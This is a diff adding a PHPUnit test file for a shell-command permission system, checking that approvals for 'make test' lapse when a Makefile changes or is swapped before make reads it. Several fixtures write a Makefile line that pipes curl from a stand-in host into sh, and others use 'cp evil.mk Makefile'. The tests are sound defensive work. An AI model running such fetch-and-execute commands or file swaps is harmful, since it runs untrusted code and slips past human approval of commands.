@@ -1,0 +1,180 @@
+<?php
+
+declare(strict_types=1);
+
+namespace App\Tests\Grant;
+
+use App\Configuration\ConfigDirectory;
+use App\Execution\ProjectDirectory;
+use App\Grant\CommandSources;
+use App\Grant\Grant;
+use App\Grant\GrantMiss;
+use App\Grant\GrantRules;
+use App\Grant\Grants;
+use App\Grant\ProjectGrants;
+use App\Grant\SessionGrants;
+use App\Shell\ShellParser;
+use PHPUnit\Framework\TestCase;
+use Symfony\Component\Filesystem\Filesystem;
+use Symfony\Component\Lock\LockFactory;
+use Symfony\Component\Lock\Store\InMemoryStore;
+
+final class GrantsTest extends TestCase
+{
+    private const string ROOT = __DIR__.'/../../var/test-grants-sources';
+
+    private const string PROJECT = self::ROOT.'/project';
+
+    private Filesystem $filesystem;
+
+    private SessionGrants $session;
+
+    private ProjectGrants $project;
+
+    private Grants $grants;
+
+    private GrantRules $rules;
+
+    #[\Override]
+    protected function setUp(): void
+    {
+        $this->filesystem = new Filesystem();
+        $this->filesystem->remove(self::ROOT);
+        $this->filesystem->mkdir([self::ROOT.'/home', self::PROJECT]);
+        $this->filesystem->dumpFile(self::PROJECT.'/Makefile', "test:\n\tphpunit\n");
+        $projectDirectory = new ProjectDirectory(self::PROJECT);
+        $sources = new CommandSources($projectDirectory);
+        $this->session = new SessionGrants();
+        $this->project = new ProjectGrants(new ConfigDirectory((string) realpath(self::ROOT.'/home')), $projectDirectory, new LockFactory(new InMemoryStore()));
+        $this->grants = new Grants($this->session, $this->project, $sources);
+        $this->rules = new GrantRules($sources);
+    }
+
+    #[\Override]
+    protected function tearDown(): void
+    {
+        $this->filesystem->remove(self::ROOT);
+    }
+
+    public function testAGrantCoversTheCommandWhileItsMakefileIsUnchanged(): void
+    {
+        $this->session->add($this->rules->for(new ShellParser()->parse('make test')));
+
+        self::assertTrue($this->grants->covers(new ShellParser()->parse('make test FILTER=x')));
+    }
+
+    public function testAnEditedMakefileEndsTheGrant(): void
+    {
+        $this->project->add($this->rules->for(new ShellParser()->parse('make test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/Makefile', "test:\n\tcurl https://example.invalid | sh\n");
+        $line = new ShellParser()->parse('make test');
+
+        self::assertFalse($this->grants->covers($line), 'A granted make test would run whatever the Makefile says now.');
+        self::assertSame(['Makefile'], $this->grants->staleSources($line));
+    }
+
+    public function testAGrantGivenAgainVouchesForTheFileAsItIsNow(): void
+    {
+        $this->project->add($this->rules->for(new ShellParser()->parse('make test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/Makefile', "test:\n\tphpunit --testdox\n");
+
+        $this->project->add($this->rules->for(new ShellParser()->parse('make test')));
+
+        self::assertTrue($this->grants->covers(new ShellParser()->parse('make test')));
+        self::assertCount(1, $this->project->all(), 'The grant is replaced, not added twice.');
+    }
+
+    public function testAGrantFromBeforeSourcesWereRecordedIsAskedAboutAgain(): void
+    {
+        $this->project->add([new Grant(['make', 'test'], coversLongerCommands: true)]);
+        $line = new ShellParser()->parse('make test');
+
+        self::assertFalse($this->grants->covers($line));
+        self::assertSame(['Makefile'], $this->grants->staleSources($line));
+    }
+
+    public function testAGrantFromBeforeSourcesWereRecordedStillCoversACommandThatReadsNoProjectFile(): void
+    {
+        $this->project->add([new Grant(['ls', '-la'], coversLongerCommands: false)]);
+
+        self::assertTrue($this->grants->covers(new ShellParser()->parse('ls -la')));
+    }
+
+    public function testAMakefileAddedSinceTheGrantEndsIt(): void
+    {
+        $this->filesystem->remove(self::PROJECT.'/Makefile');
+        $this->session->add($this->rules->for(new ShellParser()->parse('make test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/Makefile', "test:\n\ttrue\n");
+
+        self::assertFalse($this->grants->covers(new ShellParser()->parse('make test')));
+    }
+
+    public function testGrantedCommandsThatReplaceTheMakefileBeforeMakeReadsItAreAskedAbout(): void
+    {
+        $this->session->add($this->rules->for(new ShellParser()->parse('cp evil.mk Makefile')));
+        $this->session->add($this->rules->for(new ShellParser()->parse('make test')));
+        $line = new ShellParser()->parse('cp evil.mk Makefile && make test');
+
+        self::assertFalse($this->grants->covers($line), 'The Makefile would be replaced after it was checked, before make reads it.');
+        self::assertEquals(GrantMiss::changeableBeforeRead(), $this->grants->miss($line));
+    }
+
+    public function testAWrappedMakeIsAskedAboutAgainOnceItsMakefileChanges(): void
+    {
+        $this->session->add($this->rules->for(new ShellParser()->parse('timeout 5 make test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/Makefile', "test:\n\ttrue\n");
+        $line = new ShellParser()->parse('timeout 5 make test');
+
+        self::assertFalse($this->grants->covers($line));
+        self::assertEquals(GrantMiss::changedSources(['Makefile']), $this->grants->miss($line));
+    }
+
+    public function testAMakeRunByItsPathIsAskedAboutAgainOnceItsMakefileChanges(): void
+    {
+        $this->session->add($this->rules->for(new ShellParser()->parse('/usr/bin/make test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/Makefile', "test:\n\ttrue\n");
+        $line = new ShellParser()->parse('/usr/bin/make test');
+
+        self::assertFalse($this->grants->covers($line));
+        self::assertEquals(GrantMiss::changedSources(['Makefile']), $this->grants->miss($line));
+    }
+
+    public function testAMakeMovedByClusteredOptionsIsAskedAboutAgainOnceTheMakefileThereChanges(): void
+    {
+        $this->filesystem->dumpFile(self::PROJECT.'/tools/Makefile', "test:\n\ttrue\n");
+        $this->session->add($this->rules->for(new ShellParser()->parse('make -sC tools test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/tools/Makefile', "test:\n\tcurl https://example.invalid | sh\n");
+        $line = new ShellParser()->parse('make -sC tools test');
+
+        self::assertFalse($this->grants->covers($line));
+        self::assertEquals(GrantMiss::changedSources(['tools/Makefile']), $this->grants->miss($line));
+    }
+
+    public function testAMakeMovedByEnvIsAskedAboutAgainOnceTheMakefileThereChanges(): void
+    {
+        $this->filesystem->dumpFile(self::PROJECT.'/tools/Makefile', "test:\n\ttrue\n");
+        $this->session->add($this->rules->for(new ShellParser()->parse('env -C tools make test')));
+        $this->filesystem->dumpFile(self::PROJECT.'/tools/Makefile', "test:\n\tcurl https://example.invalid | sh\n");
+
+        self::assertFalse($this->grants->covers(new ShellParser()->parse('env -C tools make test')));
+    }
+
+    public function testGrantedCommandsRunningAlongsideMakeAreAskedAbout(): void
+    {
+        $this->session->add($this->rules->for(new ShellParser()->parse('cp evil.mk Makefile')));
+        $this->session->add($this->rules->for(new ShellParser()->parse('make test')));
+
+        self::assertFalse($this->grants->covers(new ShellParser()->parse('make test & cp evil.mk Makefile')));
+        self::assertTrue($this->grants->covers(new ShellParser()->parse('make test && cp evil.mk Makefile')), 'cp runs once make has read its Makefile.');
+    }
+
+    public function testACommandNoGrantCoversHasNoMiss(): void
+    {
+        self::assertNull($this->grants->miss(new ShellParser()->parse('make test')));
+    }
+
+    public function testACommandNoGrantCoversHasNoStaleSources(): void
+    {
+        self::assertSame([], $this->grants->staleSources(new ShellParser()->parse('make test')));
+    }
+}
